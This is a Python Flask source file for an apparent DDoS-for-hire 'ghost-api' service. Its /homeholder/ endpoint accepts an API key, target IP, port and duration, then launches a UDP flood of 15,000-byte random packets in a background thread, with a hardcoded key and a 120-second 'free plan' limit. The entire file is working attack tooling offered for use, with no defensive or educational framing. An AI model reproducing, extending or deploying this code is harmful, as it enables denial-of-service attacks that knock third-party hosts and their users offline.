from flask import Flask, request, jsonify
import socket, random, time
from concurrent.futures import ThreadPoolExecutor
import os

try:
    os.system('pip install flask')
except:
    print('lol')

app = Flask(__name__)

free = ['admin1632']

executor = ThreadPoolExecutor()

def perform_attack(ip, port, duration):
    bytes = random._urandom(15000)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    clock = (lambda: 0, time.perf_counter)[duration > 0]
    duration = (1, (clock() + duration))[duration > 0]
    
    while clock() < duration:
        sock.sendto(bytes, (ip, port))

@app.route('/')
def root():
    return {'ghost-api': 'No parameters selected.'}

@app.route('/homeholder/', methods=['GET'])
def homeholder():
    apikey = request.args.get('apikey')
    ip = request.args.get('ip')
    port = int(request.args.get('port'))
    duration = int(request.args.get('duration'))
    
    if apikey in free:
        if duration > 120:
            return {'ghost-api': 'free plan only allows 120 seconds'}
        else:
            executor.submit(perform_attack, ip, port, duration)
            return {'ghost-api': 'attack sent', 'ip': ip, 'port': port, 'duration': duration}
    else:
        return {'ghost-api': 'access-denied'}

if __name__ == '__main__':
    app.run()
